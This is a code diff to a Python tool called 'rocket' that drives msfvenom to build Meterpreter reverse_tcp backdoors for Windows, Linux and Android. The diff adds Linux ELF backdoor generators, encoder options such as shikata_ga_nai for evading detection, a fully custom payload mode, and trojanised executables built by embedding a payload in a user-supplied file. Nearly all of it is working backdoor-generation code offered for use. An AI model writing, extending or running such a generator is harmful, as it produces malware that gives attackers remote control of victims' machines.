@@ -119,12 +119,37 @@ try:
         embedfile = ""
         filename = ""
         directory = ""
+
         def Set(self,lhost,lport,embedfile,filename,directory):
             self.lhost = lhost
             self.lport = lport
             self.embedfile = embedfile
             self.filename = filename
             self.directory = directory
+
+    class customBackdoor:
+        lhost = ""
+        lport = ""
+        filename = ""
+        directory = ""
+        encoder = ""
+        iteration = ""
+        badchar = ""
+        payload = ""
+        platform = ""
+        formats = ""
+
+        def custom(self,lhost,lport,filename,directory,encoder,iteration,badchar,payload,platform,formats):
+            self.lhost = lhost
+            self.lport = lport
+            self.filename = filename
+            self.directory = directory
+            self.encoder = encoder
+            self.iteration = iteration
+            self.badchar = badchar
+            self.payload = payload
+            self.platform = platform
+            self.formats = formats
 
     class backdoors:
         #Windows backdoors type
@@ -153,16 +178,16 @@ try:
                 elif PLAIN == "create":
                     if backdoorSettings.lhost == "":
                         print("\033[1;91m[rocket]\033[1;m"+" Process of creating backdoor can not be continued")
-                        print("\033[1;91m[rocket]\033[1;m"+" Because on of settings is invalid, let's check it sir'")
+                        print("\033[1;91m[rocket]\033[1;m"+" Because on of settings is invalid, let's check it sit")
                     elif backdoorSettings.lport == "":
                         print("\033[1;91m[rocket]\033[1;m"+" Process of creating backdoor can not be continued")
-                        print("\033[1;91m[rocket]\033[1;m"+" Because on of settings is invalid, let's check it sir'")
+                        print("\033[1;91m[rocket]\033[1;m"+" Because on of settings is invalid, let's check it sit")
                     elif backdoorSettings.filename == "":
                         print("\033[1;91m[rocket]\033[1;m"+" Process of creating backdoor can not be continued")
-                        print("\033[1;91m[rocket]\033[1;m"+" Because on of settings is invalid, let's check it sir'")
+                        print("\033[1;91m[rocket]\033[1;m"+" Because on of settings is invalid, let's check it sit")
                     elif backdoorSettings.directory == "":
                         print("\033[1;91m[rocket]\033[1;m"+" Process of creating backdoor can not be continued")
-                        print("\033[1;91m[rocket]\033[1;m"+" Because on of settings is invalid, let's check it sir'")
+                        print("\033[1;91m[rocket]\033[1;m"+" Because on of settings is invalid, let's check it sit")
                     else:
                         backdoorGENERATE = os.system("sudo msfvenom -p windows/meterpreter/reverse_tcp -a x86 --platform windows "+"LHOST="+str(backdoorSettings.lhost)+" LPORT="+str(backdoorSettings.lport)+" -f exe -o "+str(backdoorSettings.directory)+str(backdoorSettings.filename))
                 #Commands on rocket
@@ -212,16 +237,16 @@ try:
                 elif SHIKATAGANAI == "create":
                     if backdoorSettings.lhost == "":
                         print("\033[1;91m[rocket]\033[1;m"+" Process of creating backdoor can not be continued")
-                        print("\033[1;91m[rocket]\033[1;m"+" Because on of settings is invalid, let's check it sir'")
+                        print("\033[1;91m[rocket]\033[1;m"+" Because on of settings is invalid, let's check it sit")
                     elif backdoorSettings.lport == "":
                         print("\033[1;91m[rocket]\033[1;m"+" Process of creating backdoor can not be continued")
-                        print("\033[1;91m[rocket]\033[1;m"+" Because on of settings is invalid, let's check it sir'")
+                        print("\033[1;91m[rocket]\033[1;m"+" Because on of settings is invalid, let's check it sit")
                     elif backdoorSettings.filename == "":
                         print("\033[1;91m[rocket]\033[1;m"+" Process of creating backdoor can not be continued")
-                        print("\033[1;91m[rocket]\033[1;m"+" Because on of settings is invalid, let's check it sir'")
+                        print("\033[1;91m[rocket]\033[1;m"+" Because on of settings is invalid, let's check it sit")
                     elif backdoorSettings.directory == "":
                         print("\033[1;91m[rocket]\033[1;m"+" Process of creating backdoor can not be continued")
-                        print("\033[1;91m[rocket]\033[1;m"+" Because on of settings is invalid, let's check it sir'")
+                        print("\033[1;91m[rocket]\033[1;m"+" Because on of settings is invalid, let's check it sit")
                     else:
                         backdoorGENERATE = os.system("sudo msfvenom -p windows/meterpreter/reverse_tcp -e x86/shikata_ga_nai -i 10 -b '\xff' -a x86 --platform windows "+"LHOST="+str(backdoorSettings.lhost)+" LPORT="+str(backdoorSettings.lport)+" -f exe -o "+str(backdoorSettings.directory)+str(backdoorSettings.filename))
                 #Commands on rocket
@@ -271,16 +296,16 @@ try:
                 elif CMDPOWERSHELLBASE64 == "create":
                     if backdoorSettings.lhost == "":
                         print("\033[1;91m[rocket]\033[1;m"+" Process of creating backdoor can not be continued")
-                        print("\033[1;91m[rocket]\033[1;m"+" Because on of settings is invalid, let's check it sir'")
+                        print("\033[1;91m[rocket]\033[1;m"+" Because on of settings is invalid, let's check it sit")
                     elif backdoorSettings.lport == "":
                         print("\033[1;91m[rocket]\033[1;m"+" Process of creating backdoor can not be continued")
-                        print("\033[1;91m[rocket]\033[1;m"+" Because on of settings is invalid, let's check it sir'")
+                        print("\033[1;91m[rocket]\033[1;m"+" Because on of settings is invalid, let's check it sit")
                     elif backdoorSettings.filename == "":
                         print("\033[1;91m[rocket]\033[1;m"+" Process of creating backdoor can not be continued")
-                        print("\033[1;91m[rocket]\033[1;m"+" Because on of settings is invalid, let's check it sir'")
+                        print("\033[1;91m[rocket]\033[1;m"+" Because on of settings is invalid, let's check it sit")
                     elif backdoorSettings.directory == "":
                         print("\033[1;91m[rocket]\033[1;m"+" Process of creating backdoor can not be continued")
-                        print("\033[1;91m[rocket]\033[1;m"+" Because on of settings is invalid, let's check it sir'")
+                        print("\033[1;91m[rocket]\033[1;m"+" Because on of settings is invalid, let's check it sit")
                     else:
                         backdoorGENERATE = os.system("sudo msfvenom -p windows/meterpreter/reverse_tcp -e cmd/powershell_base64 -i 10 -b '\xff' -a x86 --platform windows "+"LHOST="+str(backdoorSettings.lhost)+" LPORT="+str(backdoorSettings.lport)+" -f exe -o "+str(backdoorSettings.directory)+str(backdoorSettings.filename))
                 #Commands on rocket
@@ -333,21 +358,21 @@ try:
                 elif EMBEDDED_CMD == "create":
                     if backdoorSettings.lhost == "":
                         print("\033[1;91m[rocket]\033[1;m"+" Process of creating backdoor can not be continued")
-                        print("\033[1;91m[rocket]\033[1;m"+" Because on of settings is invalid, let's check it sir'")
+                        print("\033[1;91m[rocket]\033[1;m"+" Because on of settings is invalid, let's check it sit")
                     elif backdoorSettings.lport == "":
                         print("\033[1;91m[rocket]\033[1;m"+" Process of creating backdoor can not be continued")
-                        print("\033[1;91m[rocket]\033[1;m"+" Because on of settings is invalid, let's check it sir'")
+                        print("\033[1;91m[rocket]\033[1;m"+" Because on of settings is invalid, let's check it sit")
                     elif backdoorSettings.embedfile == "":
                         print("\033[1;91m[rocket]\033[1;m"+" Process of creating backdoor can not be continued")
-                        print("\033[1;91m[rocket]\033[1;m"+" Because on of settings is invalid, let's check it sir'")
+                        print("\033[1;91m[rocket]\033[1;m"+" Because on of settings is invalid, let's check it sit")
                     elif backdoorSettings.filename == "":
                         print("\033[1;91m[rocket]\033[1;m"+" Process of creating backdoor can not be continued")
-                        print("\033[1;91m[rocket]\033[1;m"+" Because on of settings is invalid, let's check it sir'")
+                        print("\033[1;91m[rocket]\033[1;m"+" Because on of settings is invalid, let's check it sit")
                     elif backdoorSettings.directory == "":
                         print("\033[1;91m[rocket]\033[1;m"+" Process of creating backdoor can not be continued")
-                        print("\033[1;91m[rocket]\033[1;m"+" Because on of settings is invalid, let's check it sir'")
+                        print("\033[1;91m[rocket]\033[1;m"+" Because on of settings is invalid, let's check it sit")
                     else:
-                        backdoorGENERATE = os.system("sudo msfvenom -a x86 --platform windows -x "+str(backdoorSettings.embedfile)+" -p windows/meterpreter/reverse_tcp LHOST="+str(backdoorSettings.lhost)+" LPORT="+str(backdoorSettings.lport)+" -e cmd/powershell_base64 -i 10 -f exe -o "+str(backdoorSettings.directory)+str(backdoorSettings.filename))
+                        backdoorGENERATE = os.system("sudo msfvenom -a x86 --platform windows -x "+str(backdoorSettings.embedfile)+" -p windows/meterpreter/reverse_tcp LHOST="+str(backdoorSettings.lhost)+" LPORT="+str(backdoorSettings.lport)+" -e cmd/powershell_base64 -i 10 -b '\xff' -f exe -o "+str(backdoorSettings.directory)+str(backdoorSettings.filename))
                 #Commands on rocket
                 elif EMBEDDED_CMD == "banner":
                     banner()
@@ -399,21 +424,21 @@ try:
                 elif EMBEDDED_SHIKATA == "create":
                     if backdoorSettings.lhost == "":
                         print("\033[1;91m[rocket]\033[1;m"+" Process of creating backdoor can not be continued")
-                        print("\033[1;91m[rocket]\033[1;m"+" Because on of settings is invalid, let's check it sir'")
+                        print("\033[1;91m[rocket]\033[1;m"+" Because on of settings is invalid, let's check it sit")
                     elif backdoorSettings.lport == "":
                         print("\033[1;91m[rocket]\033[1;m"+" Process of creating backdoor can not be continued")
-                        print("\033[1;91m[rocket]\033[1;m"+" Because on of settings is invalid, let's check it sir'")
+                        print("\033[1;91m[rocket]\033[1;m"+" Because on of settings is invalid, let's check it sit")
                     elif backdoorSettings.embedfile == "":
                         print("\033[1;91m[rocket]\033[1;m"+" Process of creating backdoor can not be continued")
-                        print("\033[1;91m[rocket]\033[1;m"+" Because on of settings is invalid, let's check it sir'")
+                        print("\033[1;91m[rocket]\033[1;m"+" Because on of settings is invalid, let's check it sit")
                     elif backdoorSettings.filename == "":
                         print("\033[1;91m[rocket]\033[1;m"+" Process of creating backdoor can not be continued")
-                        print("\033[1;91m[rocket]\033[1;m"+" Because on of settings is invalid, let's check it sir'")
+                        print("\033[1;91m[rocket]\033[1;m"+" Because on of settings is invalid, let's check it sit")
                     elif backdoorSettings.directory == "":
                         print("\033[1;91m[rocket]\033[1;m"+" Process of creating backdoor can not be continued")
-                        print("\033[1;91m[rocket]\033[1;m"+" Because on of settings is invalid, let's check it sir'")
+                        print("\033[1;91m[rocket]\033[1;m"+" Because on of settings is invalid, let's check it sit")
                     else:
-                        backdoorGENERATE = os.system("sudo msfvenom -a x86 --platform windows -x "+str(backdoorSettings.embedfile)+" -p windows/meterpreter/reverse_tcp LHOST="+str(backdoorSettings.lhost)+" LPORT="+str(backdoorSettings.lport)+" -e x86/shikata_ga_nai -i 10 -f exe -o "+str(backdoorSettings.directory)+str(backdoorSettings.filename))
+                        backdoorGENERATE = os.system("sudo msfvenom -a x86 --platform windows -x "+str(backdoorSettings.embedfile)+" -p windows/meterpreter/reverse_tcp LHOST="+str(backdoorSettings.lhost)+" LPORT="+str(backdoorSettings.lport)+" -e x86/shikata_ga_nai -i 10 -b '\xff' -f exe -o "+str(backdoorSettings.directory)+str(backdoorSettings.filename))
                 #Commands on rocket
                 elif EMBEDDED_SHIKATA == "banner":
                     banner()
@@ -438,9 +463,124 @@ try:
             pass
         #Linux backdoors type
         def PLAIN_linuxbackdoor(self):
-            print("this backdoor is not available yet, wait next update")
+            backdoorSettings = Settings()
+            while True:
+                PLAINlinux = str(input("\033[1;90mrocket\033[1;m[\033[1;91mPLAIN_linuxbackdoor\033[1;m]# "))
+                #Command on creating mode
+                if PLAINlinux == "back":
+                    rocket_console()
+                elif PLAINlinux == "show commands":
+                    commandsBanner()
+                elif PLAINlinux == "show settings":
+                    print("\n"+"LHOST : " + str(backdoorSettings.lhost))
+                    print("LPORT : " + str(backdoorSettings.lport))
+                    print("Filename : " + str(backdoorSettings.filename))
+                    print("Directory : " + str(backdoorSettings.directory)+"\n")
+                elif PLAINlinux == "set lhost":
+                     backdoorSettings.lhost = str(input("set \033[1;97mLHOST\033[1;m : "))
+                elif PLAINlinux == "set lport":
+                     backdoorSettings.lport = str(input("set \033[1;97mLPORT\033[1;m : "))
+                elif PLAINlinux == "set filename":
+                     backdoorSettings.filename = str(input("set \033[1;97mFilename\033[1;m : "))
+                elif PLAINlinux == "set directory":
+                     backdoorSettings.directory = str(input("set \033[1;97mDirectory\033[1;m : "))
+                elif PLAINlinux == "create":
+                    if backdoorSettings.lhost == "":
+                        print("\033[1;91m[rocket]\033[1;m"+" Process of creating backdoor can not be continued")
+                        print("\033[1;91m[rocket]\033[1;m"+" Because on of settings is invalid, let's check it sit")
+                    elif backdoorSettings.lport == "":
+                        print("\033[1;91m[rocket]\033[1;m"+" Process of creating backdoor can not be continued")
+                        print("\033[1;91m[rocket]\033[1;m"+" Because on of settings is invalid, let's check it sit")
+                    elif backdoorSettings.filename == "":
+                        print("\033[1;91m[rocket]\033[1;m"+" Process of creating backdoor can not be continued")
+                        print("\033[1;91m[rocket]\033[1;m"+" Because on of settings is invalid, let's check it sit")
+                    elif backdoorSettings.directory == "":
+                        print("\033[1;91m[rocket]\033[1;m"+" Process of creating backdoor can not be continued")
+                        print("\033[1;91m[rocket]\033[1;m"+" Because on of settings is invalid, let's check it sit")
+                    else:
+                        backdoorGENERATE = os.system("sudo msfvenom -p linux/x86/meterpreter/reverse_tcp -a x86 --platform linux "+"LHOST="+str(backdoorSettings.lhost)+" LPORT="+str(backdoorSettings.lport)+" -f elf -o "+str(backdoorSettings.directory)+str(backdoorSettings.filename))
+                #Commands on rocket
+                elif PLAINlinux == "banner":
+                    banner()
+                elif PLAINlinux == "clear":
+                    clear = os.system("clear")
+                elif PLAINlinux == "restart":
+                    StartRocket = os.system("python3 rocket.py")
+                    exit()
+                elif PLAINlinux == "exit":
+                    exit()
+                elif PLAINlinux == "ifconfig":
+                    ifconfig = os.system("ifconfig")
+                elif PLAINlinux == "show backdoors":
+                    backdoorsBanner()
+                elif PLAINlinux == "show commands":
+                    commandsBanner()
+                elif PLAINlinux == "msfconsole":
+                    msfconsole = os.system("msfconsole")
+                else:
+                    if PLAINlinux != "":
+                        print("\033[1;91m[rocket]\033[1;m command"+" : "+str(PLAINlinux)+" Command not found")
+            pass
+
         def SHIKATAGANAI_linuxbackdoor(self):
-            print("this backdoor is not available yet, wait next update")
+            backdoorSettings = Settings()
+            while True:
+                SHIKATAlinux = str(input("\033[1;90mrocket\033[1;m[\033[1;91mSHIKATAGANAI_linuxbackdoor\033[1;m]# "))
+                #Command on creating mode
+                if SHIKATAlinux == "back":
+                    rocket_console()
+                elif SHIKATAlinux == "show commands":
+                    commandsBanner()
+                elif SHIKATAlinux == "show settings":
+                    print("\n"+"LHOST : " + str(backdoorSettings.lhost))
+                    print("LPORT : " + str(backdoorSettings.lport))
+                    print("Filename : " + str(backdoorSettings.filename))
+                    print("Directory : " + str(backdoorSettings.directory)+"\n")
+                elif SHIKATAlinux == "set lhost":
+                     backdoorSettings.lhost = str(input("set \033[1;97mLHOST\033[1;m : "))
+                elif SHIKATAlinux == "set lport":
+                     backdoorSettings.lport = str(input("set \033[1;97mLPORT\033[1;m : "))
+                elif SHIKATAlinux == "set filename":
+                     backdoorSettings.filename = str(input("set \033[1;97mFilename\033[1;m : "))
+                elif SHIKATAlinux == "set directory":
+                     backdoorSettings.directory = str(input("set \033[1;97mDirectory\033[1;m : "))
+                elif SHIKATAlinux == "create":
+                    if backdoorSettings.lhost == "":
+                        print("\033[1;91m[rocket]\033[1;m"+" Process of creating backdoor can not be continued")
+                        print("\033[1;91m[rocket]\033[1;m"+" Because on of settings is invalid, let's check it sit")
+                    elif backdoorSettings.lport == "":
+                        print("\033[1;91m[rocket]\033[1;m"+" Process of creating backdoor can not be continued")
+                        print("\033[1;91m[rocket]\033[1;m"+" Because on of settings is invalid, let's check it sit")
+                    elif backdoorSettings.filename == "":
+                        print("\033[1;91m[rocket]\033[1;m"+" Process of creating backdoor can not be continued")
+                        print("\033[1;91m[rocket]\033[1;m"+" Because on of settings is invalid, let's check it sit")
+                    elif backdoorSettings.directory == "":
+                        print("\033[1;91m[rocket]\033[1;m"+" Process of creating backdoor can not be continued")
+                        print("\033[1;91m[rocket]\033[1;m"+" Because on of settings is invalid, let's check it sit")
+                    else:
+                        backdoorGENERATE = os.system("sudo msfvenom -p linux/x86/meterpreter/reverse_tcp -e x86/shikata_ga_nai -i 10 -b '\xff' -a x86 --platform linux "+"LHOST="+str(backdoorSettings.lhost)+" LPORT="+str(backdoorSettings.lport)+" -f elf -o "+str(backdoorSettings.directory)+str(backdoorSettings.filename))
+                #Commands on rocket
+                elif SHIKATAlinux == "banner":
+                    banner()
+                elif SHIKATAlinux == "clear":
+                    clear = os.system("clear")
+                elif SHIKATAlinux == "restart":
+                    StartRocket = os.system("python3 rocket.py")
+                    exit()
+                elif SHIKATAlinux == "exit":
+                    exit()
+                elif SHIKATAlinux == "ifconfig":
+                    ifconfig = os.system("ifconfig")
+                elif SHIKATAlinux == "show backdoors":
+                    backdoorsBanner()
+                elif SHIKATAlinux == "show commands":
+                    commandsBanner()
+                elif SHIKATAlinux == "msfconsole":
+                    msfconsole = os.system("msfconsole")
+                else:
+                    if SHIKATAlinux != "":
+                        print("\033[1;91m[rocket]\033[1;m command"+" : "+str(SHIKATAlinux)+" Command not found")
+            pass
         
         #Android backdoors type
         def PLAIN_androidbackdoor(self):
@@ -468,16 +608,16 @@ try:
                 elif PLAIN_ANDROID == "create":
                     if backdoorSettings.lhost == "":
                         print("\033[1;91m[rocket]\033[1;m"+" Process of creating backdoor can not be continued")
-                        print("\033[1;91m[rocket]\033[1;m"+" Because on of settings is invalid, let's check it sir'")
+                        print("\033[1;91m[rocket]\033[1;m"+" Because on of settings is invalid, let's check it sit")
                     elif backdoorSettings.lport == "":
                         print("\033[1;91m[rocket]\033[1;m"+" Process of creating backdoor can not be continued")
-                        print("\033[1;91m[rocket]\033[1;m"+" Because on of settings is invalid, let's check it sir'")
+                        print("\033[1;91m[rocket]\033[1;m"+" Because on of settings is invalid, let's check it sit")
                     elif backdoorSettings.filename == "":
                         print("\033[1;91m[rocket]\033[1;m"+" Process of creating backdoor can not be continued")
-                        print("\033[1;91m[rocket]\033[1;m"+" Because on of settings is invalid, let's check it sir'")
+                        print("\033[1;91m[rocket]\033[1;m"+" Because on of settings is invalid, let's check it sit")
                     elif backdoorSettings.directory == "":
                         print("\033[1;91m[rocket]\033[1;m"+" Process of creating backdoor can not be continued")
-                        print("\033[1;91m[rocket]\033[1;m"+" Because on of settings is invalid, let's check it sir'")
+                        print("\033[1;91m[rocket]\033[1;m"+" Because on of settings is invalid, let's check it sit")
                     else:
                         backdoorGENERATE = os.system("sudo msfvenom -p android/meterpreter/reverse_tcp -a dalvik --platform android "+"LHOST="+str(backdoorSettings.lhost)+" LPORT="+str(backdoorSettings.lport)+" R > "+str(backdoorSettings.directory)+str(backdoorSettings.filename))
                 #Commands on rocket
@@ -502,8 +642,106 @@ try:
                     if PLAIN_ANDROID != "":
                         print("\033[1;91m[rocket]\033[1;m command"+" : "+str(PLAIN_ANDROID)+" Command not found")
             pass
+        
+        #Custom backdoor
+        def CUSTOM_backdoor(self):
+            customSettings = customBackdoor()
+            while True:
+                CUSTOM = str(input("\033[1;90mrocket\033[1;m[\033[1;91mCUSTOM_backdoor\033[1;m]# "))
+                #Command on creating mode
+                if CUSTOM == "back":
+                    rocket_console()
+                elif CUSTOM == "show commands":
+                    commandsBanner()
+                elif CUSTOM == "show settings":
+                    print("\n"+"LHOST : " + str(customSettings.lhost))
+                    print("LPORT : " + str(customSettings.lport))
+                    print("Filename : " + str(customSettings.filename))
+                    print("Directory : " + str(customSettings.directory))
+                    print("encoder : " + str(customSettings.encoder))
+                    print("iteration : " + str(customSettings.iteration))
+                    print("badchar : " + str(customSettings.badchar))
+                    print("payload : " + str(customSettings.payload))
+                    print("platform : " + str(customSettings.platform))
+                    print("formats : " + str(customSettings.formats)+"\n")
+                elif CUSTOM == "set lhost":
+                     customSettings.lhost = str(input("set \033[1;97mLHOST\033[1;m : "))
+                elif CUSTOM == "set lport":
+                     customSettings.lport = str(input("set \033[1;97mLPORT\033[1;m : "))
+                elif CUSTOM == "set filename":
+                     customSettings.filename = str(input("set \033[1;97mFilename\033[1;m : "))
+                elif CUSTOM == "set directory":
+                     customSettings.directory = str(input("set \033[1;97mDirectory\033[1;m : "))
+                elif CUSTOM == "set encoder":
+                     customSettings.encoder = str(input("set \033[1;97mEncoder\033[1;m : "))
+                elif CUSTOM == "set iteration":
+                     customSettings.iteration = str(input("set \033[1;97mIteration\033[1;m : "))
+                elif CUSTOM == "set badchar":
+                     customSettings.badchar = str(input("set \033[1;97mBadchar\033[1;m : "))
+                elif CUSTOM == "set payload":
+                     customSettings.payload = str(input("set \033[1;97mPayload\033[1;m : "))
+                elif CUSTOM == "set platform":
+                     customSettings.platform = str(input("set \033[1;97mPlatform\033[1;m : "))
+                elif CUSTOM == "set formats":
+                     customSettings.formats = str(input("set \033[1;97mFormats\033[1;m : "))
+                elif CUSTOM == "create":
+                    if customSettings.lhost == "":
+                        print("\033[1;91m[rocket]\033[1;m"+" Process of creating backdoor can not be continued")
+                        print("\033[1;91m[rocket]\033[1;m"+" Because on of settings is invalid, let's check it sit")
+                    elif customSettings.lport == "":
+                        print("\033[1;91m[rocket]\033[1;m"+" Process of creating backdoor can not be continued")
+                        print("\033[1;91m[rocket]\033[1;m"+" Because on of settings is invalid, let's check it sit")
+                    elif customSettings.filename == "":
+                        print("\033[1;91m[rocket]\033[1;m"+" Process of creating backdoor can not be continued")
+                        print("\033[1;91m[rocket]\033[1;m"+" Because on of settings is invalid, let's check it sit")
+                    elif customSettings.directory == "":
+                        print("\033[1;91m[rocket]\033[1;m"+" Process of creating backdoor can not be continued")
+                        print("\033[1;91m[rocket]\033[1;m"+" Because on of settings is invalid, let's check it sit")
+                    elif customSettings.encoder == "":
+                        print("\033[1;91m[rocket]\033[1;m"+" Process of creating backdoor can not be continued")
+                        print("\033[1;91m[rocket]\033[1;m"+" Because on of settings is invalid, let's check it sit")
+                    elif customSettings.iteration == "":
+                        print("\033[1;91m[rocket]\033[1;m"+" Process of creating backdoor can not be continued")
+                        print("\033[1;91m[rocket]\033[1;m"+" Because on of settings is invalid, let's check it sit")
+                    elif customSettings.badchar == "":
+                        print("\033[1;91m[rocket]\033[1;m"+" Process of creating backdoor can not be continued")
+                        print("\033[1;91m[rocket]\033[1;m"+" Because on of settings is invalid, let's check it sit")
+                    elif customSettings.payload == "":
+                        print("\033[1;91m[rocket]\033[1;m"+" Process of creating backdoor can not be continued")
+                        print("\033[1;91m[rocket]\033[1;m"+" Because on of settings is invalid, let's check it sit")
+                    elif customSettings.platform == "":
+                        print("\033[1;91m[rocket]\033[1;m"+" Process of creating backdoor can not be continued")
+                        print("\033[1;91m[rocket]\033[1;m"+" Because on of settings is invalid, let's check it sit")
+                    elif customSettings.formats == "":
+                        print("\033[1;91m[rocket]\033[1;m"+" Process of creating backdoor can not be continued")
+                        print("\033[1;91m[rocket]\033[1;m"+" Because on of settings is invalid, let's check it sit")
+                    else:
+                        backdoorGENERATE = os.system("sudo msfvenom -p "+str(customSettings.payload)+" -e "+str(customSettings.encoder)+" -i "+str(customSettings.iteration)+" -b "+str(customSettings.badchar)+" -a x86 --platform "+str(customSettings.platform)+" "+"LHOST="+str(customSettings.lhost)+" LPORT="+str(customSettings.lport)+" -f "+str(customSettings.formats)+" -o "+str(customSettings.directory)+str(customSettings.filename))
+                #Commands on rocket
+                elif CUSTOM == "banner":
+                    banner()
+                elif CUSTOM == "clear":
+                    clear = os.system("clear")
+                elif CUSTOM == "restart":
+                    StartRocket = os.system("python3 rocket.py")
+                    exit()
+                elif CUSTOM == "exit":
+                    exit()
+                elif CUSTOM == "ifconfig":
+                    ifconfig = os.system("ifconfig")
+                elif CUSTOM == "show backdoors":
+                    backdoorsBanner()
+                elif CUSTOM == "show commands":
+                    commandsBanner()
+                elif CUSTOM == "msfconsole":
+                    msfconsole = os.system("msfconsole")
+                else:
+                    if CUSTOM != "":
+                        print("\033[1;91m[rocket]\033[1;m command"+" : "+str(CUSTOM)+" Command not found")
+            pass
 
     def rocket_console():
+        
         backdoorList = backdoors()
         rocket_console = ""
         while True:
@@ -516,7 +754,7 @@ try:
             elif rocket_console == "3":
                 backdoorList.CMDPOWERSHELLBASE64_windowsbackoor()
             elif rocket_console == "4":
-                backdoorList.EMBEDDED_CMDPOWESHELLBASE64_windowsbackdoor()
+                backdoorList.EMBEDDED_CMDPOWERSHELLBASE64_windowsbackdoor()
             elif rocket_console == "5":
                 backdoorList.EMBEDDED_SHIKATAGANAI_windowsbackdoor()
             #Linux backdoor Selection
@@ -527,6 +765,9 @@ try:
             #Android backdoor Selection
             elif rocket_console == "8":
                 backdoorList.PLAIN_androidbackdoor()
+            #Android backdoor Selection
+            elif rocket_console == "9":
+                backdoorList.CUSTOM_backdoor()
             #Commands on rocket
             elif rocket_console == "banner":
                 banner()
@@ -558,4 +799,4 @@ try:
         Main()
 
 except KeyboardInterrupt:
-    print("Shutdown Requested .......")
+    print("\033[1;91m[rocket]\033[1;m Shutdown requested !!!")
